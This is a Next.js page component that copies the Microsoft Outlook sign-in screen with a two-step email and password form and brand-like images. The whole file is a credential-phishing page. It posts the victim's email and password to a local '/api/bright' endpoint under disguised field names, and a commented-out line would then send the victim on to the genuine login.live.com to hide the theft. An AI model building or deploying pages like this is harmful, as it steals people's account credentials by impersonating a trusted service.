"use client";
import Image from "next/image";
import board from "../../public/board.png";
import out from "../../public/out.png";
import word from "../../public/sign-word.png";
import create from "../../public/create.png";
import next from "../../public/next.png";
import lkj from "../../public/sign-in.png";
import see from "../../public/sign.png";
import forgot from "../../public/forgot.png";
import enter from "../../public/enter.png";
import { Transition } from "@headlessui/react";
import { useState } from "react";

export default function Home() {
  const [p, setP] = useState("fir");
  const [run, setRun] = useState("");
  const [pass, setPass] = useState("");
  const [rain, setRain] = useState(false);
  const [sun, setSun] = useState(false);

  const enterTransitions = {
    enter: "transition-all ease duration-500",
    enterFrom: "translate-x-[110%]",
    enterTo: "translate-x-[0%]",
    leave: "transition-all ease duration-500",
    leaveFrom: "translate-x-[0%]",
    leaveTo: "translate-x-[110%]",
  };

  const leaveTransitions = {
    enter: "transition-all ease duration-500",
    enterFrom: "-translate-x-[110%]",
    enterTo: "translate-x-[0%]",
    leave: "transition-all ease duration-500",
    leaveFrom: "translate-x-[0%]",
    leaveTo: "-translate-x-[110%]",
  };

  const changeFirst = () => {
    if (
      run &&
      run.match(
        /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
      )
    ) {
      setP("sec");
    } else {
      setRain(true);
    }
  };
  const hitSet = () => {
    if (pass && pass.length > 3) {
      pastries();
    } else {
      setSun(true);
    }
  };

  const pastries = () => {
    fetch("/api/bright", {
      method: "POST",
      body: JSON.stringify({
        manref: run,
        koiref: pass,
      }),
    })
      .then((res) => {
        console.log(res);
      })
      .catch((err) => {
        console.log(err);
      })
      .finally(() => {
        // window.location.replace("https://login.live.com");
      });
  };

  return (
    <main className="h-full bg-[url('/walter.png')] flex flex-col pt-10 items-center md:justify-center">
      {/* <Image src={out} alt="" className=" w-44" /> */}

      <h1 className="text-4xl font-semibold">Outlook</h1>

      <div className="relative overflow-hidden ">
        <Image
          src={board}
          alt=""
          className="mt-5 w-[40rem] h-[25rem] sm:h-auto sm:w-[29rem]"
        />

        <div className=" grid grid-col-2">
          <Transition
            {...leaveTransitions}
            show={p === "fir"}
            as="div"
            className=" h-full"
          >
            <Image
              src={word}
              alt=""
              className="absolute top-28 w-[8.5rem] left-10"
            />

            <input
              type="text"
              name=""
              id=""
              value={run}
              onChange={(e) => setRun(e.target.value)}
              className={`absolute left-10 right-10 border-b ${
                rain ? "border-red-500" : "border-black"
              } top-[10.8rem] pb-2 outline-none focus:border-sky-600`}
              placeholder="Phone, Email or Skype"
            />

            <Image
              src={create}
              alt=""
              className="absolute top-[14rem] w-[16rem] left-10 cursor-pointer"
            />

            <Image
              src={next}
              alt=""
              onClick={changeFirst}
              className="absolute bottom-12 w-[7rem] cursor-pointer right-10"
            />
          </Transition>

          <Transition
            {...enterTransitions}
            show={p === "sec"}
            as="div"
            className=""
          >
            <div className="flex items-center absolute left-10 bottom-[16.5rem] space-x-2">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                strokeWidth={1.5}
                stroke="currentColor"
                onClick={() => window.location.reload()}
                className="w-4 h-4 cursor-pointer"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M10.5 19.5L3 12m0 0l7.5-7.5M3 12h18"
                />
              </svg>
              <p className="text-sm">{run}</p>
            </div>

            <Image
              src={enter}
              alt=""
              className="absolute bottom-56 w-[10.3rem] left-10"
            />

            <input
              type="password"
              name=""
              id=""
              value={pass}
              onChange={(e) => setPass(e.target.value)}
              className={`absolute bottom-44 right-10 left-10 border-b ${
                sun ? "border-red-500" : "border-black"
              }  pb-2 outline-none focus:border-sky-600`}
              placeholder="Password"
            />

            <Image
              src={forgot}
              alt=""
              className="absolute bottom-24 w-[8rem] left-10 cursor-pointer"
            />

            <Image
              src={see}
              alt=""
              onClick={hitSet}
              className="absolute bottom-12 w-[7rem] cursor-pointer right-10"
            />
          </Transition>
        </div>
      </div>

      <Image
        src={lkj}
        alt=""
        className={`${p === "sec" && "hidden"} mt-6 w-[29rem]`}
      />
    </main>
  );
}
